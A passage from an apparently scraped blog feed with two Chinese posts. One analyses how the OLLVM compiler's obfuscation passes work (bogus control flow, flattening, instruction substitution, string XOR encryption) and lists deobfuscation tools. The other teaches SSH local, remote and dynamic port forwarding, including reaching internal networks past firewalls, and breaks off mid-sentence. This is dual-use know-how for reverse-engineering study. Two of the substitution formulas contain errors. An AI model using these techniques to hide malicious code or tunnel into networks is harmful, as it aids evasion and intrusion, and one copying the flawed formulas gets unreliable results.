FunctionPass</span><br></pre></td></tr></table></figure><p>这里，BogusControlFlow继承至FunctionPass，因此它的入口函数即为runOnFunction</p><blockquote><p>struct的继承和class的继承有很大的区别，struct的继承是基于子类(struct)的public继承，class是基于子类(class)的private继承</p></blockquote><p>整个namespace写了一个struct 类用于混淆</p><p>其中<code>runOnFunction</code>为入口函数，先判断bcf的两个参数<code>-bcf_loop</code>和<code>-bcf_prob</code>是否符合正确范围内，然后检查是否启用了<code>-bcf</code>选项，假如启用了，则进入核心函数<code>bogus(F);</code>，然后继续处理<code>doF(*F.getParent());</code></p><p>在<code>bogus()</code>函数里，先实现了Debug的相关部分，在每次进入函数前输出debug信息，用于处理debug模式下的<code>-bcf</code>选项。然后定义一个list链表，用于储存BasicBlock，BasicBlock用for循环利用迭代器的模式从传入的 <code>F</code> 获取。一个while循环，当基本块非空时，利用<code>cryptoutils</code>工具类获取随机数，从链表中选择基本块进行混淆(用<code>addBogusFlow(basicBlock, F);</code>函数)，并标记已混淆过该块，防止重复混淆某一基本块，否则就不混淆。然后弹出链表中的第一块，这样直到混淆次数为0为止。</p><p><code>addBogusFlow()</code>函数，将给定的基本块进行添加虚假控制流。首先获得一个基本块Basic Block，利用createAlteredBasicBlock()函数生成一个与原基本块相似的Basci Block，然后利用<code>BasicBlock-&gt;getTerminator()-&gt;eraseFromParent();</code>把他们的父母节点擦除，然后创建两个条件恒为真的左右子节点，然后将其创建分支循环。（其过程是创建一个恒真的分支，进入分支的基本块后，加入一个判断，若真进入原基本块，若假进入假基本块，经假基本块的垃圾代码之后，再进入原基本块。在为真时，进入原基本块，将基本块主体执行完之后，在加入分支判断，正确返回结果，错误跳转至混假基本块进行循环）</p><blockquote><p><a href="https://sq.163yun.com/blog/article/175307579596922880：这个讲的特别形象，配合着图一起阅读，这边借用其一张图" target="_blank" rel="noopener">https://sq.163yun.com/blog/article/175307579596922880：这个讲的特别形象，配合着图一起阅读，这边借用其一张图</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/bcf_addBogusFlow.png" alt></p><p>如图，对于上述函数，分离其基本块，创建一个入口entry，然后加入一个恒真的分支，把生成相似的基本块放至错误分支里，即其永远不会执行的垃圾代码，将所执行的基本块放入正确分支里</p><p><code>createAlteredBasicBlock()</code>函数用于生成与给定基本块相似的基本块，将操作运算符进行重新映射，重新映射节点，重新映射对应的数据，然后加入随机的指令</p><p>对于<code>doF()</code>函数，该函数的功能是将Function中所有为真的判断语句进行替换，比如之前的<code>1.0 == 1.0</code>。它的思想是定义两个全局变量x、y并且初始化为0，然后遍历Module内的所有指令，并将所有的FCMP_TRUE分支指令替换为<code>y&lt;10 || x*x(x-1)%2 ==0</code>，我们从反汇编的代码来看，很明显的就有y&lt;10这个分支</p><h4 id="Flattening"><a href="#Flattening" class="headerlink" title="Flattening"></a>Flattening</h4><p><strong>Flattening</strong>的主要功能是为函数增加switch-case语句，使得函数变得扁平化。下面就对它的实现源码进行分析。</p><p>其中文件位于<code>./include/llvm/Transforms/Obfuscation/Flattening.cpp</code></p><p>Flattening继承了<code>FunctionPass</code>，因此它的入口函数即为<code>runOnFunction</code>。在<code>runOnFunction</code>函数的具体实现中，首先判断是否包含了启动<code>-fla</code>的命令。在编译目标程序代码时，如要启动fla模块，需要带上参数<code>-mllvm -fla</code>。</p><p>参数检查完毕之后，调用flatten函数。flatten函数是该Pass的核心，下面对该函数进行分析。</p><p>先是声明了一些后面要用的变量，然后创建了一个数组，用来存储随机数种子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SCRAMBLER</span></span><br><span class="line">  <span class="keyword">char</span> scrambling_key[<span class="number">16</span>];</span><br><span class="line">  llvm::cryptoutils-&gt;get_bytes(scrambling_key, <span class="number">16</span>);</span><br><span class="line">  <span class="comment">// END OF SCRAMBLER  </span></span><br><span class="line"><span class="comment">// Lower switch</span></span><br><span class="line">  FunctionPass *lower = createLowerSwitchPass();</span><br><span class="line">  lower-&gt;runOnFunction(*f);</span><br></pre></td></tr></table></figure><p>后两行调用了外部一个外部pass：<code>creatLowerSwitchPass()</code>，用来消除当前函数的内部用switch方式的代码，将其全转换成<code>if else</code>的调用，方便后面的代码块分割</p><p>然后一个for循环，像bcf那样，将函数分为各个基本块储存在<code>vector&lt;BasicBlock *&gt; origBB</code>的一个向量数组里，等等的代码是针对基本块的操作，就像乐高那样一块块进行拼接。</p><p>然后的话，若只有一个以下的基本块，那么无法平坦化，直接返回<code>false</code></p><p>然后开始遍历基本块，先把第一块从vector数组中移除，因为按照他的流程平坦化的设计，第一块进行单独处理，作为整个混淆流程的开始逻辑，所以紧接着先对第一块进行处理。</p><p>检查第一块中是否包含条件跳转分支，如果包含条件跳转分支，则按照条件分支的位置进行代码块分割，分割逻辑跟SplitBasicBlock的逻辑一致，整个分割的目的也是为了后面进行流程平坦化准备的</p><p>然后开始是核心代码了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create switch variable and set as it</span></span><br><span class="line">  switchVar =</span><br><span class="line">      <span class="keyword">new</span> AllocaInst(Type::getInt32Ty(f-&gt;getContext()), <span class="number">0</span>, <span class="string">"switchVar"</span>, insert);</span><br><span class="line">  <span class="keyword">new</span> StoreInst(</span><br><span class="line">      ConstantInt::get(Type::getInt32Ty(f-&gt;getContext()),</span><br><span class="line">                       llvm::cryptoutils-&gt;scramble32(<span class="number">0</span>, scrambling_key)),</span><br><span class="line">      switchVar, insert);</span><br></pre></td></tr></table></figure><p>这一段创建了一个switch用的变量，相当于是<code>switch(caseVar)</code>，并通过<code>StoreInst</code>进行赋值，这时就用上了之前的随机数种子，将生成的随机数用作case。</p><p>接着创建了两个空的基本块<code>loopEntry</code>和<code>loopEnd</code>，然后将switch语句放入<code>loopEntry</code>中，将第一块基本块连接上<code>loopEntry</code>，<code>loopEnd</code>跳转回<code>loopEntry</code>，在switch语句加入默认的<code>swDefault</code>基本块大概成型了</p><p>大概就和下面这个流程图差不多了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  +--------+</span></span><br><span class="line"><span class="comment">//                  |first bb|</span></span><br><span class="line"><span class="comment">//                  +---+----+</span></span><br><span class="line"><span class="comment">//                      |</span></span><br><span class="line"><span class="comment">//                 +----v----+</span></span><br><span class="line"><span class="comment">//                 |loopEntry| &lt;--------+</span></span><br><span class="line"><span class="comment">//                 +----+----+          |</span></span><br><span class="line"><span class="comment">//                      |               |</span></span><br><span class="line"><span class="comment">//                 +----v---+           |</span></span><br><span class="line"><span class="comment">//                 | switch |           |</span></span><br><span class="line"><span class="comment">//                 +----+---+           |</span></span><br><span class="line"><span class="comment">//                      |               |</span></span><br><span class="line"><span class="comment">//         +------------+               |</span></span><br><span class="line"><span class="comment">//         |                            |</span></span><br><span class="line"><span class="comment">//+------v-------+                    |</span></span><br><span class="line"><span class="comment">//| default case |                    |</span></span><br><span class="line"><span class="comment">//+------+-------+                    |</span></span><br><span class="line"><span class="comment">//         |                            |</span></span><br><span class="line"><span class="comment">//         +-----------+                |</span></span><br><span class="line"><span class="comment">//                     |                |</span></span><br><span class="line"><span class="comment">//                     |                |</span></span><br><span class="line"><span class="comment">//                     v                |</span></span><br><span class="line"><span class="comment">//               +-----+------+         |</span></span><br><span class="line"><span class="comment">//               |  loopEnd   +---------+</span></span><br><span class="line"><span class="comment">//               +------------+</span></span><br></pre></td></tr></table></figure><p>骨架成型了，接下来把剩余的基本块往switch语句中填入就行了。</p><p>但是填入之后肯定是个死循环了，我们这时候就要活用flatten的思想，控制switch case的caseVar的值来达到控制流程的目的——很简单，在每个基本块即每个case之后，补上一条对caseVar的值更新的语句即可达到控制流程的目的</p><p>剩下代码就是来更新每个case中代码块对caseVar的操作了，怎么更新呢，很简单，就是更新成当前代码块原后续逻辑块在当前这个代码框架下的case值</p><p>接下来的操作分三种情况来进行</p><ul><li><p>case中代码块没有后续块，那就是一个返回块，不需要更新caseVar</p></li><li><p>case中代码块只有一个后续块，也就是一个无条件跳转分支，直接更新成后续块对应的case即可</p></li><li><p>case中代码块有2个后续块，也就是一个条件跳转分支，通过successor对象（就是后续块的意思）直接在switch结构中查找出对应的case值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SelectInst *sel =SelectInst::Create(br-&gt;getCondition(), numCaseTrue, numCaseFalse, <span class="string">""</span>,i-&gt;getTerminator());</span><br></pre></td></tr></table></figure><p>如上，使用llvm的SelectInst来实现分支选择，像227行写的，根据br-&gt;getCondition()是否为True来决定是跳转到numCaseTrue还是numCaseFalse</p></li></ul><p>最后这样就成功平坦化成功了</p><p>拿一个例子来理解：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> result;</span><br><span class="line">     <span class="keyword">if</span>(a&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            result=a+b;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">            result=a-b;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下图，这是原本上面这个函数的IR图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/fla_1.png" alt></p><p>先判断第一个基本块有没有if语句，我们这个函数刚开始明显没有，先将第一块分开成一个基本块</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/fla_2.png" alt></p><p>然后创建三个基本块<code>loopEntry</code>、<code>loopEnd</code>、<code>swDefault</code>，组成如下图左边的流程</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/fla_3.png" alt></p><p>这时候，switch语句我们已经可以看见了，接下来就是将vector里存储的每个基本块加入switch-case语句中，每一个basicblock对应一个case，并且caseVar为刚开始产生的随机数值，如下图所示</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/fla_4.png" alt></p><p>添加完全部基本块之后，需要修改每个基本块的跳转关系，使得每个基本块执行完毕之后，会重新设置caseVar的值，从而跳转到<code>loopEnd</code>块，然后回到switch-case的判断语句中，能够顺利跳转到下个case，处理后即为下图成型</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/fla_5.png" alt></p><h4 id="Substitution"><a href="#Substitution" class="headerlink" title="Substitution"></a>Substitution</h4><p>Substitution的主要功能是对程序的一些指令进行替换。</p><p>其中文件位于<code>./include/llvm/Transforms/Obfuscation/substitution.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMBER_ADD_SUBST 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMBER_SUB_SUBST 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMBER_AND_SUBST 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMBER_OR_SUBST 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMBER_XOR_SUBST 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> cl::opt&lt;<span class="keyword">int</span>&gt;</span><br><span class="line">ObfTimes(<span class="string">"sub_loop"</span>,</span><br><span class="line">         cl::desc(<span class="string">"Choose how many time the -sub pass loops on a function"</span>),</span><br><span class="line">         cl::value_desc(<span class="string">"number of times"</span>), cl::init(<span class="number">1</span>), cl::Optional);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Stats</span></span><br><span class="line">STATISTIC(Add, <span class="string">"Add substitued"</span>);</span><br><span class="line">STATISTIC(Sub, <span class="string">"Sub substitued"</span>);</span><br><span class="line"><span class="comment">// STATISTIC(Mul,  "Mul substitued");</span></span><br><span class="line"><span class="comment">// STATISTIC(Div,  "Div substitued");</span></span><br><span class="line"><span class="comment">// STATISTIC(Rem,  "Rem substitued");</span></span><br><span class="line"><span class="comment">// STATISTIC(Shi,  "Shift substitued");</span></span><br><span class="line">STATISTIC(And, <span class="string">"And substitued"</span>);</span><br><span class="line">STATISTIC(Or, <span class="string">"Or substitued"</span>);</span><br><span class="line">STATISTIC(Xor, <span class="string">"Xor substitued"</span>);</span><br></pre></td></tr></table></figure><p>如上代码，通过该文件的宏定义，就可知每种运算替换的方式有多少种，可以对哪些指令进行替换：很明显的有：加减、位的与、或、异或，五种运算的替换</p><p>而注释的是未实现的运算替换，在官方wiki里可以知道，为了保证混淆再恢复之后的正确性，避免浮点数运算带来的程序误差，所以没有实现这些运算的替换（乘、除、取余，移位）</p><p>在源文件里，类似地，在相应的namespace里定义了这些内容，与之前两个混淆方式类似，<code>substitution</code>继承于<code>FunctionPass</code>，以<code>runOnFuntion</code>函数为入口，里面再判断flag参数正确之后，朴实无华地调用了<code>substitute(tmp)</code>函数己行混淆</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ollvm-learning/sub_1.png" alt></p><p>主函数<code>substitute()</code>很简单，用一个while循环维护混淆次数(即给的flag参数<code>-sub_loop</code>)，然后两层<code>for</code>循环。第一个for循环用来遍历函数中的基本块(Basic Block)，第二个<code>for</code>循环用于遍历每个基本块中的所有指令，然后采用一个<code>switch-case</code>语句用来针对不同指令的不同替换操作，case里用随机数来决定用哪种方式去替换</p><p>接下来的所有代码都是其替换方式的实现</p><blockquote><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Instructions-Substitution" target="_blank" rel="noopener">Instructions-Substitution</a>：在其官方wiki里都有说明是怎样的替换方式，在其注释下代码很好理解，相关的函数不懂就查查llvm的函数库就可以了</p><ul><li><p><code>Add</code>指令支持4种替换方法，分别是</p><ul><li><code>a = b - (-c)</code></li><li><code>a = -(-b + (-c))</code></li><li><code>r = rand (); a = b + r; a = a + c; a = a – r</code></li><li><code>r = rand (); a = b - r; a = a + b; a = a + r</code></li></ul></li><li><p><code>Sub</code>指令支持3种替换方法，分别是</p><ul><li><code>a = b + (-c)</code></li><li><code>r = rand (); a = b + r; a = a - c; a = a – r</code></li><li><code>r = rand (); a = b - r; a = a - c; a = a + r</code></li></ul></li><li><p><code>And</code> 指令支持1种替换方法，分别是</p><ul><li><code>a = b &amp; c</code> =&gt; <code>a = (b^~c)&amp; b</code></li></ul></li></ul><ul><li><p><code>Or</code>指令支持1种替换方法，分别是</p><ul><li><code>a = b | c</code> =&gt; <code>a = (b &amp; c) | (b ^ c)</code></li></ul></li></ul><ul><li><p><code>Xor</code> 指令支持1种替换方法，分别是</p><ul><li><code>a = a ^ b</code>=&gt; <code>a = (!a &amp; b) | (a &amp; !b)</code></li></ul></li></ul></blockquote><h4 id="StringObfuscation"><a href="#StringObfuscation" class="headerlink" title="StringObfuscation"></a>StringObfuscation</h4><p>有很多大佬对于ollvm的混淆进行了升级，每个版本对于其混淆的实现方式各不相同，这边我分析的是上海交通大学的孤挺花项目的字符串混淆实现分析，项目地址为：<a href="https://github.com/GoSSIP-SJTU/Armariris" target="_blank" rel="noopener">https://github.com/GoSSIP-SJTU/Armariris</a></p><p>与上面三种原有项目的混淆方式不同，字符串混淆的类<code>StringObfuscationPass</code>继承至<code>ModulePass</code>，在入口函数<code>runOnModule</code>里重写了父类函数，在里面实现了加密，在私有函数中实现了解密函数，在加密的末尾实现了调用，保证函数运行的正确性</p><p>函数的思想：是以两个vector来存储静态变量和加密后的字符串，利用Module类的<code>global_iterator</code>迭代器遍历全局变量，判断是否为<code>.str.</code>类型，即字符串类型，进行加密替换，加密方式采用了最原始的异或加密</p><h4 id="bug寻找"><a href="#bug寻找" class="headerlink" title="bug寻找"></a>bug寻找</h4><p>适配llvm9.0和ollvm4.0时发生了许多错误</p><p>可见 <a href="./ollvm-learning/bug_log.txt">bug_Log</a></p><p><a href="https://www.cnblogs.com/wpgraceii/p/10622582.html" target="_blank" rel="noopener">Segmentation Fault 的原因若干</a></p><p>最快的当然还是把相关错误的llvm4.0的代码移植到llvm9.0处</p><p>解决string_obf error编译时报强制转换类型错误方法 ：<a href="http://hellollvm.org/slides/porting-ollvm.pdf" target="_blank" rel="noopener">http://hellollvm.org/slides/porting-ollvm.pdf</a></p><blockquote><p> <a href="http://hellollvm.org/" target="_blank" rel="noopener">http://hellollvm.org/</a></p></blockquote><h3 id="对抗"><a href="#对抗" class="headerlink" title="对抗"></a>对抗</h3><p>//TODO：大坑，现在对逆向还不是很熟悉，先对方法了解一波</p><p>引用项目Fllvm(虽然他不开源)中，作者对自己改写的ollvm变版fllvm的自信，来学习对抗ollvm的方式</p><blockquote><p>Fllvm与当前反混淆工具的对抗：当前应对ollvm混淆的大体方法为：自写脚本、bcf、decllvm、符合执行。前三个无论是自己找规律，还是基于capstone(反汇编引擎)，对Fllvm都只存在理论的可行性，基本用途不大。</p></blockquote><p>由作者一段话可知，大概就是找规律写脚本复原，或者采用符号执行的方式去反混淆(原谅我真的找不到作者所说的bcf是啥)</p><p>我看的大多找规律的都是从原版ollvm的混淆方式入手，写反混淆的脚本去运行</p><p>还是能用符号执行分析的大佬比较nb</p><blockquote><p>资料：</p><p><a href="https://www.freebuf.com/articles/terminal/130142.html" target="_blank" rel="noopener">反混淆：恢复被OLLVM保护的程序</a></p><p><a href="https://bbs.pediy.com/thread-252321.htm" target="_blank" rel="noopener">[原创]ARM64 OLLVM反混淆</a></p><p><a href="https://www.anquanke.com/post/id/200744" target="_blank" rel="noopener">Android OLLVM反混淆实战</a>：基于Angr</p><p><a href="https://www.hacking8.com/uploadfile/kcon/2019/24%E6%97%A5/%E5%9F%BA%E4%BA%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8F%8D%E6%B7%B7%E6%B7%86%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6.pdf" target="_blank" rel="noopener">基于符号执行的反混淆方法研究.pdf</a></p><p><a href="https://www.hacking8.com/uploadfile/kcon/2019/24日/基于符号执行的反混淆方法研究.pdf" target="_blank" rel="noopener">基于符号执行的反混淆方法研究.pdf</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">利用符号执行去除控制流平坦化</a></p><p><a href="https://www.cnblogs.com/h2zZhou/p/6637890.html" target="_blank" rel="noopener">反混淆：恢复被OLLVM保护的程序</a></p><p><a href="https://mlog.club/article/3446618" target="_blank" rel="noopener">使用Binary Ninja去除ollvm流程平坦混淆</a></p><blockquote><p>关于逆向：<a href="https://blog.yuuoniy.cn/2018/08/03/XMAN-reversing-1/" target="_blank" rel="noopener">https://blog.yuuoniy.cn/2018/08/03/XMAN-reversing-1/</a></p></blockquote></blockquote><blockquote><ul><li>基于Miasm框架(一个Python开源逆向工程框架)，进行反混淆</li></ul><p><a href="https://github.com/cea-sec/miasm" target="_blank" rel="noopener">https://github.com/cea-sec/miasm</a><br><a href="https://www.freebuf.com/articles/terminal/130142.html" target="_blank" rel="noopener">反混淆：恢复被OLLVM保护的程序</a></p><ul><li>IDA插件，利用micro code API进行反混淆</li></ul><p>Hex-rays：<a href="http://www.hexblog.com/?p=1248" target="_blank" rel="noopener">Hex-Rays Microcode API vs. Obfuscating Compiler</a><br>项目地址：<a href="https://github.com/RolfRolles/HexRaysDeob" target="_blank" rel="noopener">Github-RolfRolles / HexRaysDeob</a><br><a href="https://xz.aliyun.com/t/6749" target="_blank" rel="noopener">使用IDA microcode去除ollvm混淆(上)</a></p><ul><li>DecLLVM，针对OLLVM的IDA分析插件<br><a href="https://github.com/F8LEFT/DecLLVM" target="_blank" rel="noopener">Github-F8LEFT / DecLLVM</a><br><a href="https://gitlab.com/F8LEFT/DecLLVM" target="_blank" rel="noopener">Gitlab-F8LEFT / DecLLVM</a><br><a href="https://www.52pojie.cn/thread-484892-1-1.html" target="_blank" rel="noopener">吾爱破解2016安全挑战赛cm7 Android CrackMe 分析详解</a></li></ul><ul><li>Unicorn 引擎<br><a href="https://bbs.pediy.com/thread-224330.htm" target="_blank" rel="noopener">[翻译]Unicorn引擎教程</a><br><a href="https://bbs.pediy.com/thread-252257.htm" target="_blank" rel="noopener">[原创]使用unicorn engin还原Armariris字符串混淆</a></li></ul><ul><li>Angr 符号执行框架<br>Github里有</li></ul></blockquote><blockquote><p>关于符号执行：</p><p><a href="https://pdfs.semanticscholar.org/a29f/c90b207befb42f67a040c6a07ea6699f6bad.pdf" target="_blank" rel="noopener">符号执行</a>是一种重要的形式化方法和软件分析技术，通过使用符号执行技术，将程序中变量的值表示为符号值和常量组成的计算表达式，符号是指取值集合的记号，程序计算的输出被表示为输入符号值的函数，其在软件测试和程序验证中发挥着重要作用，并可以应用于程序漏洞的检测。</p><p>符号执行的发展是从静态符号执行到动态符号执行到<a href="http://dslab.epfl.ch/pubs/selsymbex.pdf" target="_blank" rel="noopener">选择性符号执行</a>，动态符号执行会以具体数值作为输入来模拟执行程序，是<a href="http://mir.cs.illinois.edu/marinov/publications/SenETAL05CUTE.pdf" target="_blank" rel="noopener">混合执行</a>(concolic execution)的典型代表，有很高的精确度，目前较新的符号执行工具有<a href="https://github.com/JonathanSalwan/Triton" target="_blank" rel="noopener">Triton</a>和<a href="https://github.com/angr/angr" target="_blank" rel="noopener">angr</a></p><p>关于符号执行的paper：<a href="https://github.com/saswatanand/symexbib" target="_blank" rel="noopener">https://github.com/saswatanand/symexbib</a></p><p>符号执行的框架：Miasm、Angr、Triton</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
          <category> llvm </category>
          
          <category> Compile </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> ollvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH端口转发</title>
      <link href="/2020/02/22/SSH-Port-Forwarding/"/>
      <url>/2020/02/22/SSH-Port-Forwarding/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH端口转发"><a href="#SSH端口转发" class="headerlink" title="SSH端口转发"></a><center>SSH端口转发</center></h1><blockquote><p>参考：</p><p><a href="https://juejin.im/post/5dabc760518825040063205e" target="_blank" rel="noopener">ssh端口转发的三种方式</a></p><p><a href="https://lotabout.me/2019/SSH-Port-Forwarding/" target="_blank" rel="noopener">SSH 端口转发教程</a></p><p><a href="https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/" target="_blank" rel="noopener"><a href="https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/" target="_blank" rel="noopener">玩转SSH端口转发</a></a></p><p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="noopener">实战 SSH 端口转发</a></p></blockquote><p>课上看老师演示过，感觉端口转发这个操作真的是贼好用，直接利用外部公网ip连接到了他的虚拟机内网，便想具体学习学习</p><p>总所皆知，ssh是我们常用的工具之一，基本快赶上vim的使用频率。我们一般都会使用ssh来进行远程连接服务器，但是这次来学习一次ssh骚操作——ssh端口转发</p><p>SSH端口转发也被称作SSH隧道(SSH Tunnel)，因为它们都是通过SSH登陆之后，在<strong>SSH客户端</strong>与<strong>SSH服务端</strong>之间建立了一个隧道，从而进行通信。SSH隧道是非常安全的，因为SSH是通过加密传输数据的(SSH全称为Secure Shell)。</p><p>SSH有三种端口转发模式，<strong>本地端口转发(Local Port Forwarding)</strong>，<strong>远程端口转发(Remote Port Forwarding)</strong>以及<strong>动态端口转发(Dynamic Port Forwarding)</strong>。对于本地/远程端口转发，两者的方向恰好相反。<strong>动态端口转发</strong>则可以用于科学上网。</p><h2 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h2><p>本地端口转发（<strong>Local Port Forwarding</strong>），是将本地主机某个端口流量转发到远程主机的指定端口。其命令行语法是：<code>ssh -L [bind_address]:localport:remote_host:remote_port</code>。</p><p><code>ssh -L 本地网卡地址:本地端口:目标地址:目标端口</code></p><p>也可以是：<code>ssh -L [bind_address]:port_a:remote_host:port_b user@host</code></p><p>将本地绑定的地址的a端口的流量转发至<code>user@host</code>主机的<code>remote_host</code>的<code>port_b</code>端口</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SSH-Port-Forwarding/1.png" alt></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -L 1234:localhost:22 root@remote_ip</span><br></pre></td></tr></table></figure><p>如上所示，我们在本地将1234端口的数据转发到远程主机的22端口，访问我本地localhost的1234端口(左)，等于以localhost的身份访问我远程主机22端口 </p><p><img src="https://magic-king.net/images/loading.gif" data-original="SSH-Port-Forwarding/local-port-forwarding-single.svg" alt></p><p>上图中，远程的机器上起了一个服务 <code>python3 -m http.server</code>，它监听端口 <code>8000</code>，现在我们想在本机访问这个服务，但由于防火墙的存在，<code>8000</code> 端口无法直接访问，于是我们使用 ssh 端口转发。首先在 A 上执行 <code>ssh -L 1234:localhost:8000 user_b@ip_b</code> 建立 ssh 隧道，它表示：所有对 <code>A:1234</code> 端口的请求，相当于在 <code>B</code> 机器上对 <code>localhost:8000</code> 的请求。因此在 A 上执行 <code>curl localhost:1234</code> 就相当于访问 B 机器上的 python 服务。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SSH-Port-Forwarding/local-port-forwarding-two.svg" alt></p><p>假如web服务部署在其他机器上(Remote Machine C)，可以看到我们只是把上例中的 <code>localhost</code> 换成了 C 机器的 hostname/IP 就可以了。此时，发送到 <code>A:1234</code> 的请求相当于从 B 机器上对 <code>remote:8000</code> 的请求，图中在 <code>/etc/hosts</code> 中设置了 hostname 和 IP 的对应关系，直接用机器 C 的 IP 也是可以的。</p><p>同时可以看到，机器 A 由于防火墙无法访问内网的服务，但是由于①机器A可以ssh到内网机器B②B有权限访问到内网的其他服务，通过本地端口转发可以实现从A访问内网的服务。</p><p>机器A通过ssh隧道访问本地端口，相当于机器B访问remote:port。</p><h2 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h2><p>远程端口转发（<strong>Remote Port Forwarding</strong>），是将将发送到远程端口的请求，转发到目标端口。其命令行语法是：<code>ssh -R 远程网卡地址:远程端口:目标地址:目标端口</code>。</p><p>当然也可以是：<code>ssh -R &lt;prot_a&gt;:&lt;remote_host&gt;:&lt;port_a&gt; user_a@ip_a</code></p><p>远程转发最常用的功能是<strong>内网穿透</strong>。有一个公网ip的主机，便可以借助ssh隧道的远程转发实现内网渗透，达到外网访问内网资源的目的。需要注意的是ssh远程转发<strong>默认只能绑定远程主机的本地地址</strong>，即<code>127.0.0.1</code>。如果想要监听来自其他主机的连接，需要修改远程主机ssh的配置,将”GatewayPorts”改成“yes”，重启ssh后生效。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="SSH-Port-Forwarding/remote-port-forwarding.svg" alt></p><p>如图，假如A可以联网且有公网ip，B可以联网（即可以远程连接A），此时执行命令的是属于内网里且没用公网ip的机器B</p><p>我们可以通过访问A的公网ip达到访问内网BC所部署的服务</p><p>简单来说在本地执行ssh命令称为本地转发，在远程机器中执行命令就属于远程转发</p><h2 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h2><p>无论本地转发还是远程转发，都需要指定本地和远程主机的端口。动态转发（<strong>Dynamic Port Forwarding</strong>）则摆脱这种限制，只绑定本地端口，远程主机和端口由发起的请求决定。动态转发的语法是：<code>ssh -D bind_address:port</code>，也可以是<code>ssh -D &lt;port&gt; 